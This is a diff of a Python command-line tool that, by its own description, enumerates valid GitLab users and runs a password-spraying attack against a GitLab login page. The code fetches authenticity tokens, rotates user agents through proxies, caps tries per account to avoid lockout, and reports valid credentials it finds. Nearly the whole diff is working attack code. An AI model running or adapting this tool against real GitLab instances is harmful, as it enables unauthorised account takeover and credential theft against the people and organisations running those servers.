@@ -4,106 +4,30 @@ import argparse
 import requests
 from bs4 import BeautifulSoup
 
-#0. Argparse (--proxy | -t | -v | -A )
-#0.1. Argparse enum(-h | -U)
-#0.2. Argparse spray(-h | -U/-u | -p/-P | -c | ???-w(threshold))
-#Spray (-c )
-
 def main():
     parser = argparse.ArgumentParser(
-        description = '',
-        add_help = True,
-        prefix_chars = '-'
-    )
+        description = 'Enumerate Gitlab valid users and perform a Password Spraying Attack.', add_help = True, prefix_chars = '-')
     subparsers = parser.add_subparsers(dest = 'command')
-    enum_parser = subparsers.add_parser('enum', help = '')
-    enum_parser.add_argument(
-        '-U',
-        help = '',
-        metavar = '',
-        required = True
-    )
-    enum_parser.add_argument(
-        '--proxy',
-        help = '',
-        metavar = ''
-    )
-    enum_parser.add_argument(
-        '-A',
-        help = '',
-        metavar = ''
-    )
-    enum_parser.add_argument(
-        '-t',
-        help = '',
-        metavar = '',
-        required = True,
-        type = str
-    )
-    enum_parser.add_argument(
-        '-v',
-        help = '',
-        action = 'store_true',
-        default = False
-    )
+    enum_parser = subparsers.add_parser('enum', help = 'Enumerate Gitlab valid users.')
+    enum_parser.add_argument('-U', help = 'User wordlist.', metavar = '<WORDLIST>', required = True)
+    enum_parser.add_argument('--proxy', help = 'Web Proxy URL.', metavar = '<URL>')
+    enum_parser.add_argument('-A', help = 'Specify a User-Agent', metavar = '<USER-AGENT>')
+    enum_parser.add_argument('-t', help = 'Target URL.', metavar = '<URL>', required = True, type = str)
+    enum_parser.add_argument('-v', help = 'Verbose.', action = 'store_true', default = False)
 
     spray_parser = subparsers.add_parser('spray', help = '')
     usergroup = spray_parser.add_mutually_exclusive_group(required = True)
-    usergroup.add_argument(
-        '-U',
-        help = '',
-        metavar = ''
-    )
-    usergroup.add_argument(
-        '-u',
-        help = '',
-        metavar = ''
-    )
+    usergroup.add_argument('-U', help = 'User Wordlist.', metavar = '<WORDLIST>')
+    usergroup.add_argument('-u', help = 'Specify a single user.', metavar = '<USER>')
     passgroup = spray_parser.add_mutually_exclusive_group(required = True)
-    passgroup.add_argument(
-        '-P',
-        help = '',
-        metavar = ''
-    )
-    passgroup.add_argument(
-        '-p',
-        help = '',
-        metavar = ''
-    )
-    spray_parser.add_argument(
-        '-c',
-        action = 'store_true',
-        default = False
-    )
-    spray_parser.add_argument(
-        '-w',
-        type = int,
-        help = '',
-        metavar = ''
-    )
-    spray_parser.add_argument(
-        '--proxy',
-        help = '',
-        metavar = ''
-    )
-    spray_parser.add_argument(
-        '-A',
-        help = '',
-        metavar = ''
-    )
-    spray_parser.add_argument(
-        '-t',
-        help = '',
-        metavar = '',
-        required = True,
-        type = str
-    )
-    spray_parser.add_argument(
-        '-v',
-        help = '',
-        action = 'store_true',
-        default = False
-    )
+    passgroup.add_argument('-P', help = 'Password Wordlist.', metavar = '<WORDLIST>')
+    passgroup.add_argument('-p', help = 'Specify a single user.', metavar = '<PASSWORD>')
+    spray_parser.add_argument('-w', type = int, help = 'Number of tries per account.', metavar = '<INT>')
+    spray_parser.add_argument('--proxy', help = 'Web Proxy URL.', metavar = '<URL>')
+    spray_parser.add_argument('-A', help = 'User-Agent Wordlist.', metavar = '<WORDLIST>')
+    spray_parser.add_argument('-t', help = 'Target URL.', metavar = '<URL>', required = True, type = str)
+    spray_parser.add_argument('-v', help = 'Verbose.', action = 'store_true', default = False)
+    spray_parser.add_argument('-vv', help = 'Verbose 2.', action = 'store_true', default = False)
     args = parser.parse_args()
     
     proxies = {}
@@ -112,9 +36,13 @@ def main():
             'http': args.proxy,
             'https': args.proxy
             }
-    headers = {'Connection': 'Close'}
+    headers = {
+        'Connection': 'Close'
+        }
     if args.A:
-        headers.update({'User-Agent': args.A})
+        headers.update(
+            {'User-Agent': args.A}
+            )
     target = args.t
 
     def get_token(target, headers):
@@ -129,7 +57,9 @@ def main():
 
         if args.v:
             print(f'[*]Getting Authenticity Token: {token}')
-            #print(cookies)
+        if args.vv:
+            print(f'[*]Getting Authenticity Token: {token}')
+            print(cookies)
         session.close()
         return token, cookies
 
@@ -199,6 +129,9 @@ def main():
                 if args.v:
                     print(f'[*]{username}\'s Lockout Count = {c}')
                     print(f'[*]Testing {username}:{password}')
+                if args.vv:
+                    print(f'[*]{username}\'s Lockout Count = {c}')
+                    print(f'[*]Testing {username}:{password}')
                 payload = {
                     'utf8': "✓",
                     'authenticity_token': token,
@@ -206,38 +139,22 @@ def main():
                     'user[password]': password,
                     'user[remember_me]': '0'
                 }
-                #print(payload)
+                if args.vv:
+                    print(payload)
                 r = requests.post(login_url, headers=headers,proxies=proxies, data=payload, cookies=cookies, allow_redirects=False)
-                #print(headers, cookies)
+                if args.vv:
+                   print(headers, cookies)
                 if r.status_code == 302 and "Invalid Login or password." not in r.text:
                     print(f'[+]VALID CREDENTIALS FOUND - {username}:{password}')
                     exit()
                 else:
+                    if args.vv:
+                        print(r.status_code, r.headers)
+                        print(f'[-]Invalid Login - {username}:{password}')
                     if args.v:
-                        #print(r.status_code, r.headers)
-                        print(f'Invalid Login - {username}:{password}')
+                        print(f'[-]Invalid Login - {username}:{password}')
                 if c == args.w:
                     break
-
-
-
-
-
-        
-            
-
-        
-
-
-
-
-    
-
-
-
-
-
-
 
 if __name__ == '__main__':
     main()
